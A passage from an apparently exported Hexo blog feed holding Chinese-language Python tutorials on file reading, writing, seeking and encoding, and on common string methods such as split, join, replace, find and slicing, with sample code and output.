helloa</span></span><br><span class="line"><span class="comment">#     # b</span></span><br><span class="line"><span class="comment">#     # c</span></span><br><span class="line"><span class="comment">#     # d</span></span><br><span class="line"><span class="comment">#     # e</span></span><br></pre></td></tr></table></figure><h1 id="写到文件最后"><a href="#写到文件最后" class="headerlink" title="写到文件最后"></a>写到文件最后</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'a+'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">'写到文件最后'</span>)</span><br><span class="line">    f.seek(<span class="number">0</span>)</span><br><span class="line">    print(f.read())</span><br><span class="line"><span class="comment">#     # 1111</span></span><br><span class="line"><span class="comment">#     # 222</span></span><br><span class="line"><span class="comment">#     # 333</span></span><br><span class="line"><span class="comment">#     # 44</span></span><br><span class="line"><span class="comment">#     # 5555</span></span><br><span class="line"><span class="comment">#     # 666</span></span><br><span class="line"><span class="comment">#     # 你好!</span></span><br><span class="line"><span class="comment">#     # hello写到文件最后</span></span><br></pre></td></tr></table></figure><h1 id="查看文件编码"><a href="#查看文件编码" class="headerlink" title="查看文件编码"></a>查看文件编码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'a+'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.encoding) <span class="comment">#查看文件编码</span></span><br><span class="line"><span class="comment">#     #utf - 8</span></span><br><span class="line"><span class="comment"># #'字符串'---------encode---------》bytes</span></span><br><span class="line"><span class="comment"># #bytes---------decode---------》'字符串'</span></span><br></pre></td></tr></table></figure><h1 id="b模式不能指定编码"><a href="#b模式不能指定编码" class="headerlink" title="b模式不能指定编码"></a>b模式不能指定编码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_data=f.read()</span><br><span class="line">    print(file_data)</span><br><span class="line">    print(file_data.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment">#     # b'1111\r\n222\r\n333\r\n44\r\n5555\r\n666\r\n\xe4\xbd\xa0\xe5\xa5\xbd!\r\nhello'</span></span><br><span class="line"><span class="comment">#     # 1111</span></span><br><span class="line"><span class="comment">#     # 222</span></span><br><span class="line"><span class="comment">#     # 333</span></span><br><span class="line"><span class="comment">#     # 44</span></span><br><span class="line"><span class="comment">#     # 5555</span></span><br><span class="line"><span class="comment">#     # 666</span></span><br><span class="line"><span class="comment">#     # 你好!</span></span><br><span class="line"><span class="comment">#     # hello</span></span><br></pre></td></tr></table></figure><h1 id="边写边读"><a href="#边写边读" class="headerlink" title="边写边读"></a>边写边读</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_data = <span class="string">'test wb'</span></span><br><span class="line">    f.write(file_data.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    f.seek(<span class="number">0</span>)</span><br><span class="line">    print(f.read())</span><br><span class="line"><span class="comment">#     # b'test wb'</span></span><br></pre></td></tr></table></figure><h1 id="flush-tell-seek-truncate"><a href="#flush-tell-seek-truncate" class="headerlink" title="flush(),tell(),seek(),truncate()"></a>flush(),tell(),seek(),truncate()</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flush() 文件内容从内存刷到硬盘</span><br><span class="line">tell()  查看文件当前光标位置</span><br><span class="line">seek(<span class="number">3</span>) <span class="comment">#从开头开始算，将光标移动到第三个字节</span></span><br><span class="line">        <span class="comment">#   seek 有三种工作方式，seek(offset[, whence])</span></span><br><span class="line">        <span class="comment">#   seek(2,0)=seek(2),0是默认方式，相当于从0字节位置开始</span></span><br><span class="line">        <span class="comment">#   seek(2,1)   1 相对当前位置</span></span><br><span class="line">        <span class="comment">#   seek(-2,2)  2 从文件末尾开始</span></span><br><span class="line">truncate(<span class="number">10</span>) <span class="comment">#从开头开始算，将文件只保留从0-10个字节的内容，文件打开方式必须包含"写"，</span></span><br><span class="line">               <span class="comment">#但是w和w+除外，因为这两种方式会首先把文件清空。</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'ab'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.truncate(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="打印文件最后一行"><a href="#打印文件最后一行" class="headerlink" title="打印文件最后一行"></a>打印文件最后一行</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:   <span class="comment">#这种方式不会读取整个文件，需要从哪里读取才从哪里开始读取，循环文件的推荐方式</span></span><br><span class="line">        offs=<span class="number">-5</span>         <span class="comment">#偏移量，根据一行大小确定</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            f.seek(offs,<span class="number">2</span>)</span><br><span class="line">            data=f.readlines()</span><br><span class="line">            <span class="keyword">if</span> len(data) &gt; <span class="number">1</span>:</span><br><span class="line">                print(<span class="string">'这是最后一行：'</span>,data[<span class="number">-1</span>].decode(<span class="string">'utf-8'</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            offs*=<span class="number">2</span></span><br><span class="line"><span class="comment"># 这是最后一行： hello你好!hello你好!hello你好!hello你好!</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python基础 </tag>
            
            <tag> wiki </tag>
            
            <tag> fix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python字符串操作</title>
      <link href="/cs/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/"/>
      <url>/cs/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>字符串。<br><a id="more"></a><br><a href="https://docs.python.org/3/library/string.html" target="_blank" rel="noopener">https://docs.python.org/3/library/string.html</a></p><h1 id="dir-str"><a href="#dir-str" class="headerlink" title="dir(str)"></a>dir(str)</h1><p>split()：一个能基于某些分隔符来对字符串进行切割的方法。如果你没有为其提供具体参数，它就会默认空格为其分隔符。<br>strip()：一个可以从字符串中删除其尾随空白符（如’\n’、’\n\r’）的方法。<br>另外，你也可以通过rstrip()和lstrip()来选择是剥离字符串左边还是右边的尾部空白符。upper()/lower()：我们可以用这些方法来改变字符串中字母的大小写。   &gt;&gt;&gt; print<br>replace()：该方法可用于替换目标字符串中的某个子串。<br>当然，字符串类型的函数可远不止这些。这里只是讨论了其中最常用的一些而已<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(str)</span><br><span class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getnewargs__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mod__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__rmod__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'capitalize'</span>, <span class="string">'casefold'</span>, <span class="string">'center'</span>, <span class="string">'count'</span>, <span class="string">'encode'</span>, <span class="string">'endswith'</span>, <span class="string">'expandtabs'</span>, <span class="string">'find'</span>, <span class="string">'format'</span>, <span class="string">'format_map'</span>, <span class="string">'index'</span>, <span class="string">'isalnum'</span>, <span class="string">'isalpha'</span>, <span class="string">'isascii'</span>, <span class="string">'isdecimal'</span>, <span class="string">'isdigit'</span>, <span class="string">'isidentifier'</span>, <span class="string">'islower'</span>, <span class="string">'isnumeric'</span>, <span class="string">'isprintable'</span>, <span class="string">'isspace'</span>, <span class="string">'istitle'</span>, <span class="string">'isupper'</span>, <span class="string">'join'</span>, <span class="string">'ljust'</span>, <span class="string">'lower'</span>, <span class="string">'lstrip'</span>, <span class="string">'maketrans'</span>, <span class="string">'partition'</span>, <span class="string">'replace'</span>, <span class="string">'rfind'</span>, <span class="string">'rindex'</span>, <span class="string">'rjust'</span>, <span class="string">'rpartition'</span>, <span class="string">'rsplit'</span>, <span class="string">'rstrip'</span>, <span class="string">'split'</span>, <span class="string">'splitlines'</span>, <span class="string">'startswith'</span>, <span class="string">'strip'</span>, <span class="string">'swapcase'</span>, <span class="string">'title'</span>, <span class="string">'translate'</span>, <span class="string">'upper'</span>, <span class="string">'zfill'</span>]</span><br></pre></td></tr></table></figure></p><h2 id="去空格及特殊符号"><a href="#去空格及特殊符号" class="headerlink" title="去空格及特殊符号"></a>去空格及特殊符号</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.strip().lstrip().rstrip(<span class="string">','</span>)</span><br></pre></td></tr></table></figure><h2 id="复制字符串"><a href="#复制字符串" class="headerlink" title="复制字符串"></a>复制字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">'Ab'</span></span><br><span class="line">print(str1*<span class="number">5</span>)  <span class="comment">## AbAbAbAbAb</span></span><br><span class="line">print(<span class="number">5</span>*str1)  <span class="comment">## AbAbAbAbAb</span></span><br></pre></td></tr></table></figure><h2 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h2><p><a href="https://www.pythontab.com/html/2015/pythonhexinbiancheng_1112/981.html" target="_blank" rel="noopener">python字符串连接的三种方法及其效率、适用场景详解</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'a'</span></span><br><span class="line">str2=<span class="string">'b'</span></span><br><span class="line"><span class="keyword">print</span> str1+str2  <span class="comment">## ab</span></span><br></pre></td></tr></table></figure><h2 id="连接字符串-带连接符"><a href="#连接字符串-带连接符" class="headerlink" title="连接字符串(带连接符)"></a>连接字符串(带连接符)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#S.join(seq) #把seq代表的字符串序列，用S连接起来</span></span><br><span class="line">delimiter = <span class="string">','</span></span><br><span class="line">mylist = [<span class="string">'Brazil'</span>, <span class="string">'Russia'</span>, <span class="string">'India'</span>, <span class="string">'China'</span>]  <span class="comment">#Brazil,Russia,India,China</span></span><br><span class="line"><span class="keyword">print</span> delimiter.join(mylist)</span><br></pre></td></tr></table></figure><h2 id="分割字符串"><a href="#分割字符串" class="headerlink" title="分割字符串"></a>分割字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#S.rsplit([sep, [maxsplit]])</span></span><br><span class="line"><span class="comment">#以sep为分隔符，把S分成一个list。maxsplit表示分割的次数。默认的分割符为空白字符</span></span><br><span class="line">s = <span class="string">'ab,cde,fgh,ijk'</span></span><br><span class="line">print(s.split(<span class="string">','</span>)) <span class="comment">#返回列表 ['ab', 'cde', 'fgh', 'ijk']</span></span><br></pre></td></tr></table></figure><h2 id="按行分割字符串"><a href="#按行分割字符串" class="headerlink" title="按行分割字符串"></a>按行分割字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">S.splitlines([keepends])</span><br><span class="line"><span class="comment">#把S按照行分割符分为一个list，keepends是一个bool值，如果为真每行后而会保留行分割符。</span></span><br></pre></td></tr></table></figure><h2 id="替换字符串"><a href="#替换字符串" class="headerlink" title="替换字符串"></a>替换字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">S.replace(oldstr, newstr, [count])</span><br><span class="line"><span class="comment">#把S中的oldstar替换为newstr，count为替换次数。这是替换的通用形式，还有一些函数进行特殊字符的替换</span></span><br><span class="line">S.strip([chars])</span><br><span class="line"><span class="comment">#把S中前后chars中有的字符全部去掉，可以理解为把S前后chars替换为None</span></span><br><span class="line">S.lstrip([chars])</span><br><span class="line">S.rstrip([chars])</span><br><span class="line">S.expandtabs([tabsize])<span class="comment">#把S中的tab字符替换没空格，每个tab替换为tabsize个空格，默认是8个</span></span><br></pre></td></tr></table></figure><h2 id="批量替换"><a href="#批量替换" class="headerlink" title="批量替换"></a>批量替换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#S.translate(table[,deletechars])</span></span><br><span class="line"><span class="comment">## 使用上面的函数产后的翻译表，把S进行翻译，并把deletechars中有的字符删掉。需要注意的是，如果S为unicode字符串，那么就不支持 deletechars参数，可以使用把某个字符翻译为None的方式实现相同的功能。此外还可以使用codecs模块的功能来创建更加功能强大的翻译表。</span></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> maketrans   <span class="comment"># 引用 maketrans 函数。</span></span><br><span class="line">intab = <span class="string">"aeiou"</span></span><br><span class="line">outtab = <span class="string">"12345"</span></span><br><span class="line">trantab = maketrans(intab, outtab)  <span class="comment">#这里注意一下</span></span><br><span class="line">str = <span class="string">"this is string example....wow!!!"</span>;</span><br><span class="line"><span class="keyword">print</span> str.translate(trantab);</span><br></pre></td></tr></table></figure><h2 id="查找字符"><a href="#查找字符" class="headerlink" title="查找字符"></a>查找字符</h2><p>返回第一个字符出现的位置。&lt; 0 为未找到<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">'strchr'</span></span><br><span class="line">substr = <span class="string">'ch'</span></span><br><span class="line">n = str.index(substr)</span><br><span class="line"><span class="keyword">print</span> n  <span class="comment">## 3 非子字符串时报错，其余返回子字符串第一个字符的下标。中文报错</span></span><br></pre></td></tr></table></figure></p><h2 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sStr1 = <span class="string">'abcdefg'</span></span><br><span class="line">sStr2 = <span class="string">'cde'</span></span><br><span class="line"><span class="keyword">print</span> sStr1.find(sStr2) <span class="comment">#非子字符串时返回-1。否则返回子字符串第一个字符的下标。中文报错。</span></span><br></pre></td></tr></table></figure><h2 id="字符串中的搜索"><a href="#字符串中的搜索" class="headerlink" title="字符串中的搜索"></a>字符串中的搜索</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回S中出现substr的第一个字母的标号，如果S中没有substr则返回-1。start和end作用就相当于在S[start:end]中搜索</span></span><br><span class="line">S.index(substr, [start, [end]])</span><br><span class="line"><span class="comment">#与find()相同，只是在S中没有substr时，会返回一个运行时错误</span></span><br><span class="line">S.rfind(substr, [start, [end]])</span><br><span class="line"><span class="comment">#返回S中最后出现的substr的第一个字母的标号，如果S中没有substr则返回-1，也就是说从右边算起的第一次出现的substr的首字母标号</span></span><br><span class="line">S.rindex(substr, [start, [end]])</span><br><span class="line">S.count(substr, [start, [end]]) <span class="comment">#计算substr在S中出现的次数</span></span><br></pre></td></tr></table></figure><h2 id="比较字符串-cmp-str1-str2"><a href="#比较字符串-cmp-str1-str2" class="headerlink" title="比较字符串 cmp(str1,str2)"></a>比较字符串 cmp(str1,str2)</h2><p> <a href="http://www.runoob.com/python/func-number-cmp.html" target="_blank" rel="noopener">http://www.runoob.com/python/func-number-cmp.html</a></p><h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sStr1 = <span class="string">'12345678'</span></span><br><span class="line">sStr2 = <span class="string">'ab'</span></span><br><span class="line"><span class="keyword">print</span> (sStr2 <span class="keyword">and</span> sStr1) <span class="comment">## 12345678</span></span><br><span class="line"><span class="keyword">print</span> (sStr1 <span class="keyword">and</span> sStr2) <span class="comment">## ab</span></span><br><span class="line"><span class="keyword">print</span> len(sStr2 <span class="keyword">and</span> sStr1) <span class="comment">## 8</span></span><br><span class="line"><span class="keyword">print</span> len(sStr1 <span class="keyword">and</span> sStr2) <span class="comment">## 2</span></span><br></pre></td></tr></table></figure><h2 id="字符串长度-len-str"><a href="#字符串长度-len-str" class="headerlink" title="字符串长度 len(str)"></a>字符串长度 len(str)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sStr1 = <span class="string">'strlen'</span></span><br><span class="line"><span class="keyword">print</span> len(sStr1)</span><br></pre></td></tr></table></figure><h2 id="将字符串中的大小写转换"><a href="#将字符串中的大小写转换" class="headerlink" title="将字符串中的大小写转换"></a>将字符串中的大小写转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">S=<span class="string">'abEfeDg'</span></span><br><span class="line">print(S.lower()) <span class="comment">#小写 abefedg</span></span><br><span class="line">print(S.upper()) <span class="comment">#大写 ABEFEDG</span></span><br><span class="line">print(S.swapcase()) <span class="comment">#大小写互换 ABeFEdG</span></span><br><span class="line">print(S.capitalize()) <span class="comment">#首字母大写 Abefedg</span></span><br></pre></td></tr></table></figure><h2 id="取子字符串"><a href="#取子字符串" class="headerlink" title="取子字符串"></a>取子字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tr1 = <span class="string">'1234567890'</span></span><br><span class="line">print(tr1[<span class="number">0</span>:<span class="number">3</span>]) <span class="comment">#截取第一位到第三位的字符 123</span></span><br><span class="line">print(tr1[:]) <span class="comment">#截取字符串的全部字符 1234567890</span></span><br><span class="line">print(tr1[<span class="number">6</span>:]) <span class="comment">#截取第七个字符到结尾 7890</span></span><br><span class="line">print(tr1[:<span class="number">-3</span>]) <span class="comment">#截取从头开始到倒数第三个字符之前 1234567</span></span><br><span class="line">print(tr1[<span class="number">2</span>]) <span class="comment">#截取第三个字符 3</span></span><br><span class="line">print(tr1[<span class="number">-1</span>]) <span class="comment">#截取倒数第一个字符 0</span></span><br><span class="line">print(tr1[:<span class="number">-1</span>]) <span class="comment">#123456789 </span></span><br><span class="line">print(tr1[::<span class="number">-1</span>]) <span class="comment">#创造一个与原字符串顺序相反的字符串 0987654321 翻转字符串</span></span><br><span class="line">print(tr1[<span class="number">-3</span>:<span class="number">-1</span>]) <span class="comment">#截取倒数第三位与倒数第一位之前的字符 89</span></span><br><span class="line">print(tr1[<span class="number">-3</span>:]) <span class="comment">#截取倒数第三位到结尾 890</span></span><br><span class="line">print(tr1[:<span class="number">-5</span>:<span class="number">-3</span>]) <span class="comment">#逆序截取，具体啥意思没搞明白？ 07</span></span><br></pre></td></tr></table></figure><h2 id="扫描字符串"><a href="#扫描字符串" class="headerlink" title="扫描字符串"></a>扫描字符串</h2><h3 id="for-c-in-str1"><a href="#for-c-in-str1" class="headerlink" title="for c in str1:"></a>for c in str1:</h3><h3 id="if-c-in-str2"><a href="#if-c-in-str2" class="headerlink" title="if c in str2:"></a>if c in str2:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#strpbrk(sStr1,sStr2)</span></span><br><span class="line">sStr1 = <span class="string">'cekjgdklab'</span></span><br><span class="line">sStr2 = <span class="string">'gka'</span></span><br><span class="line">nPos = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> sStr1:</span><br><span class="line">    print(c)</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> sStr2:</span><br><span class="line">        nPos = sStr1.index(c)</span><br><span class="line">        print(nPos)</span><br><span class="line"><span class="comment">## c</span></span><br><span class="line"><span class="comment">## e</span></span><br><span class="line"><span class="comment">## k</span></span><br><span class="line"><span class="comment">## 2</span></span><br><span class="line"><span class="comment">## j</span></span><br><span class="line"><span class="comment">## g</span></span><br><span class="line"><span class="comment">## 4</span></span><br><span class="line"><span class="comment">## d</span></span><br><span class="line"><span class="comment">## k</span></span><br><span class="line"><span class="comment">## 2</span></span><br><span class="line"><span class="comment">## l</span></span><br><span class="line"><span class="comment">## a</span></span><br><span class="line"><span class="comment">## 8</span></span><br><span class="line"><span class="comment">## b</span></span><br></pre></td></tr></table></figure><h2 id="PHP-中-addslashes-的实现"><a href="#PHP-中-addslashes-的实现" class="headerlink" title="PHP 中 addslashes 的实现"></a>PHP 中 addslashes 的实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addslashes</span><span class="params">(s)</span>:</span></span><br><span class="line">    d = &#123;<span class="string">'"'</span>:<span class="string">'\\"'</span>, <span class="string">"'"</span>:<span class="string">"\\'"</span>, <span class="string">"\0"</span>:<span class="string">"\\\0"</span>, <span class="string">"\\"</span>:<span class="string">"\\\\"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(d.get(c, c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">    <span class="comment">## s = "John 'Johny' Doe (a.k.a. \"Super Joe\")\\\0"</span></span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="keyword">print</span> addslashes(s)</span><br></pre></td></tr></table></figure><h2 id="只显示字母与数字"><a href="#只显示字母与数字" class="headerlink" title="只显示字母与数字"></a>只显示字母与数字</h2><h3 id="if-not-c-in-format"><a href="#if-not-c-in-format" class="headerlink" title="if not c in format:"></a>if not c in format:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OnlyCharNum</span><span class="params">(s)</span>:</span></span><br><span class="line">    s2 = s.lower();</span><br><span class="line">    fomart = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s2:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> c <span class="keyword">in</span> fomart:</span><br><span class="line">            s = s.replace(c,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">print(OnlyCharNum(<span class="string">"a000 Aaa-b"</span>)) <span class="comment">## a000Aaab</span></span><br></pre></td></tr></table></figure><h2 id="字符串在输出时的对齐"><a href="#字符串在输出时的对齐" class="headerlink" title="字符串在输出时的对齐"></a>字符串在输出时的对齐</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">"this is string example wow!!!"</span></span><br><span class="line">print(str.ljust(<span class="number">40</span>,<span class="string">'a'</span>))   </span><br><span class="line">print(str.ljust(<span class="number">41</span>,<span class="string">'a'</span>))   </span><br><span class="line">print(str.rjust(<span class="number">40</span>,<span class="string">'a'</span>))  </span><br><span class="line">print(str.center(<span class="number">40</span>,))</span><br><span class="line">print(str.zfill(<span class="number">40</span>))</span><br><span class="line"><span class="comment">## this is string example wow!!!aaaaaaaaaaa</span></span><br><span class="line"><span class="comment">## this is string example wow!!!aaaaaaaaaaaa</span></span><br><span class="line"><span class="comment">## aaaaaaaaaaathis is string example wow!!!</span></span><br><span class="line"><span class="comment">##      this is string example wow!!!</span></span><br><span class="line"><span class="comment">## 00000000000this is string example wow!!!</span></span><br></pre></td></tr></table></figure><h2 id="字符串还有一对编码和解码的函数"><a href="#字符串还有一对编码和解码的函数" class="headerlink" title="字符串还有一对编码和解码的函数"></a>字符串还有一对编码和解码的函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#S.encode([encoding,[errors]])</span></span><br><span class="line"><span class="comment">## 其中encoding可以有多种值，</span></span><br><span class="line"><span class="comment">## 比如gb2312 gbk gb18030 bz2 zlib big5 bzse64等都支持。</span></span><br><span class="line"><span class="comment">## errors默认值为"strict"，意思是UnicodeError。</span></span><br><span class="line"><span class="comment">## 可能的值还有'ignore', 'replace', 'xmlcharrefreplace', 'backslashreplace' 和所有的通过codecs.register_error注册的值。</span></span><br><span class="line"><span class="comment">## 这一部分内容涉及codecs模块</span></span><br><span class="line">S.decode([encoding,[errors]])</span><br></pre></td></tr></table></figure><h2 id="字符串的测试、判断函数"><a href="#字符串的测试、判断函数" class="headerlink" title="字符串的测试、判断函数"></a>字符串的测试、判断函数</h2><p>这一类函数在string模块中没有，这些函数返回的都是bool值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 